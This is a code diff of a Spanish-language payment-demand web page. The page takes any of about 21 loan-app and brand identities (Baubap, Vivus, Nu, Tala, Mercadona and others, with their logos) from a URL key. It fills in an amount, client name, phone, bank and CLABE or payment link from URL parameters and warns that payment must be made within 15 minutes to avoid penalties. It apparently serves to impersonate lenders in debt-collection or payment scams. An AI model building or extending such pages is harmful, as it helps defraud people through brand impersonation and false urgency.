@@ -14,7 +14,7 @@
 <body>
 
     <div class="detail-card">
-        <!-- Encabezado -->
+        <!-- Encabezado con color dinámico -->
         <div id="header-bg" class="pt-8 pb-5 text-center text-white flex flex-col items-center justify-center">
             <div class="w-16 h-16 bg-white rounded-2xl mb-2 flex items-center justify-center overflow-hidden border-2 border-white/20 shadow-md">
                 <img id="img-app" src="" class="w-full h-full object-cover">
@@ -45,7 +45,7 @@
                     <span id="txt-banco" class="font-black text-slate-900">BBVA</span>
                 </div>
 
-                <!-- Bloque CLABE -->
+                <!-- Bloque de transferencia más compacto (Link / CLABE) -->
                 <div class="pt-1 text-center space-y-1">
                     <span class="text-[8px] text-gray-400 uppercase tracking-wider block font-black">Liga de Pago / CLABE</span>
                     <div class="flex items-center justify-between bg-white border border-slate-200/80 rounded-lg py-1.5 px-3 shadow-sm max-w-[280px] mx-auto">
@@ -59,7 +59,7 @@
                 </div>
             </div>
 
-            <!-- Advertencia -->
+            <!-- Advertencia inferior -->
             <p class="text-[9px] font-black text-red-500 uppercase leading-tight px-4">
                 ⚠️ Advertencia: Realiza el pago en menos de 15 minutos para evitar penalizaciones automáticas.
             </p>
@@ -67,21 +67,47 @@
     </div>
 
     <script>
-        // Recuperamos la información guardada en la sesión
-        const dataRaw = sessionStorage.getItem('orden_pago');
-        const data = dataRaw ? JSON.parse(dataRaw) : {};
+        const APPS = {
+            baubap: { name: 'Baubap', color: '#10b981', img: 'https://play-lh.googleusercontent.com/8bT4kFxFzPy078zlO7h97O2fTBLu5NTemiSr2oxtMnRdZu8OFr5Js7HJ_rMXkL5N0DfHiaTH2vGMhXn353ol=w240-h480-rw' },
+            vivus: { name: 'Vivus', color: '#0284c7', img: 'https://play-lh.googleusercontent.com/FpMOQImteiJbZywbqSs6SNQ0ChSTrKNrdQ8I1y9oZjfG8oNv8UbdY-arrWTjFWOU7xZFhOsZ3qkL5UM2JWxO=w240-h480-rw' },
+            efectivohoy: { name: 'Efectivo Hoy', color: '#10b981', img: 'https://play-lh.googleusercontent.com/jVIVA0_ESxvZoa1KZiMlVE6AZF333aD9SHdyUEoPabhC-QvI9Yoj9E78PBIC0DWUZeE8_CFF9oncLVveolJg' },
+            inuprestamos: { name: 'iNU Prestamos', color: '#820ad1', img: 'https://is1-ssl.mzstatic.com/image/thumb/PurpleSource211/v4/44/c4/c9/44c4c962-5c65-f333-d9d1-d7fd9ddff574/Placeholder.mill/400x400bb-75.webp' },
+            okcredito: { name: 'OK CRÉDITO', color: '#0284c7', img: 'https://app-prestamos.mx/wp-content/uploads/2022/10/okcredito.png' },
+            creditala: { name: 'CREDITALA', color: '#ea580c', img: 'https://play-lh.googleusercontent.com/bIY9u_xUX_Tu3R8CSyEG336yp-1HIczE2iXKqoX-6C3XIojeudqF_1rJmtR3IrImGGlQW4FFWJBNIb8SouUo=w480-h960-rw' },
+            affluente: { name: 'Affluente Financiero', color: '#0f766e', img: 'https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/33/c0/06/33c00607-cb57-559f-f1a3-8c914e6546b9/AppIcon-0-0-1x_U007emarketing-0-6-0-85-220.png/400x400ia-75.webp' },
+            prestamos: { name: 'Préstamos', color: '#a3e635', img: 'https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/cb/a8/7a/cba87ab7-2fe9-aad7-e49f-a367d6c410b4/AppIcon-1x_U007ephone-0-1-0-85-220-0.jpeg/1200x630wa.png' },
+            dinero: { name: 'Préstamos de Dinero', color: '#1e40af', img: 'https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/31/78/92/317892a1-467e-c2c7-b7c5-be2a58b7d358/AppIcon-1x_U007ephone-0-1-0-85-220-0.png/400x400ia-75.webp' },
+            nu: { name: 'Préstamos NU', color: '#820ad1', img: 'https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Nubank_logo_2021.svg/1200px-Nubank_logo_2021.svg.png' },
+            talacred: { name: 'Tala Crédito', color: '#06b6d4', img: 'https://play-lh.googleusercontent.com/DK9nyWUY6ZkHNh3TNSqbr8LTzxSGLJZZq-3QunZ-qkKIl3vYd8Ie8XGYQNrABCZ_T7Y=w480-h960-rw' },
+            mercadona: { name: 'MERCADONA', color: '#007a33', img: 'https://is1-ssl.mzstatic.com/image/thumb/PurpleSource221/v4/25/9d/8e/259d8e75-f5f7-eefb-73de-0f5d693e7544/Placeholder.mill/400x400bb-75.webp' },
+            tilt: { name: 'Tilt', color: '#3b82f6', img: 'https://play-lh.googleusercontent.com/GALkEmiM5acYbAGJVkkma1Ij5rDW6CWhSKeGFLcXddAtK3uXmgCPxvfAnVxe325A2_b80xRieYiGjktUw5ajww=w480-h960-rw' },
+            dida: { name: 'DidaPréstamos', color: '#0057ff', img: 'https://is1-ssl.mzstatic.com/image/thumb/PurpleSource211/v4/e2/14/27/e21427df-1404-f93c-c8b9-230ef12d4870/Placeholder.mill/400x400bb-75.webp' },
+            rapidos: { name: 'Préstamos rápidos', color: '#10b981', img: 'https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/7f/68/39/7f683903-e675-6fbc-56fa-64d6fb206e2d/AppIcon-1x_U007ephone-0-1-0-85-220-0.jpeg/400x400ia-75.webp' },
+            worldmox: { name: 'Worldmoxpro cash', color: '#1e293b', img: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTOQ9FrkHlgWkaMJt_Za2IN0R5Z0UamJ_VQKg&s' },
+            movil: { name: 'Movil Cash', color: '#22c55e', img: 'https://play-lh.googleusercontent.com/OhU802wo_ffOcR5f6MAvz5ebNFvXOLDiC2p_b7kGS7_XBwFz3HI9jtNn6C8fBiQrzjUx' },
+            cashcredit: { name: 'Cash Credit', color: '#f59e0b', img: 'https://play-lh.googleusercontent.com/kw_CZs5smCFpyFtI9pWkKhY1eRfX6E15tdTEU_KpxTaUYzUtRFx9b8eOJYpn-Ze4BQ=w480-h960-rw' },
+            stori: { name: 'Stori Crédito', color: '#7c3aed', img: 'https://play-lh.googleusercontent.com/oXTAgpljdbV5LuAOt1NP9_JafUZe9BNl7pwQ01ndl4blYL4N4IQh4-n456P5l_hc1A=s96-rw' },
+            facil: { name: 'Fácil Préstamo', color: '#0ea5e9', img: 'https://play-lh.googleusercontent.com/4cDOjhOrs563pTALZF8fikthh5xznVnrFXReAOmWoNkfI0jncuig3l5hzOiNABAaw=w480-h960-rw' },
+            tala: { name: 'Tala Préstamos', color: '#fb923c', img: 'https://play-lh.googleusercontent.com/DK9nyWUY6ZkHNh3TNSqbr8LTzxSGLJZZq-3QunZ-qkKIl3vYd8Ie8XGYQNrABCZ_T7Y=w480-h960-rw' }
+        };
 
-        document.getElementById('header-bg').style.backgroundColor = data.c1 || '#820ad1';
-        document.getElementById('img-app').src = data.img || '';
-        document.getElementById('txt-app').innerText = data.v || 'Aplicación';
+        const p = new URLSearchParams(window.location.search);
+        
+        // Obtener app mediante la clave corta
+        const appKey = p.get('app') || 'baubap';
+        const appInfo = APPS[appKey] || APPS['baubap'];
 
-        const montoFormateado = parseFloat(data.m || 0).toLocaleString('es-MX', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        document.getElementById('header-bg').style.backgroundColor = appInfo.color;
+        document.getElementById('img-app').src = appInfo.img;
+        document.getElementById('txt-app').innerText = appInfo.name;
+
+        const montoFormateado = parseFloat(p.get('m') || 0).toLocaleString('es-MX', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
         document.getElementById('txt-monto').innerText = '$' + montoFormateado;
-        document.getElementById('txt-cliente').innerText = data.n || 'CLIENTE';
-        document.getElementById('txt-tel').innerText = data.t || '0000000000';
-        document.getElementById('txt-clabe').innerText = data.c || '000000000000000000';
+        document.getElementById('txt-cliente').innerText = decodeURIComponent(p.get('n') || 'CLIENTE');
+        document.getElementById('txt-tel').innerText = p.get('t') || '0000000000';
+        document.getElementById('txt-clabe').innerText = p.get('c') || '000000000000000000';
 
-        let bancoLimpio = data.b || 'BBVA';
+        let bancoLimpio = p.get('b') || 'BBVA';
         bancoLimpio = bancoLimpio.replace(/[123]/g, '').trim(); 
         document.getElementById('txt-banco').innerText = bancoLimpio;
 
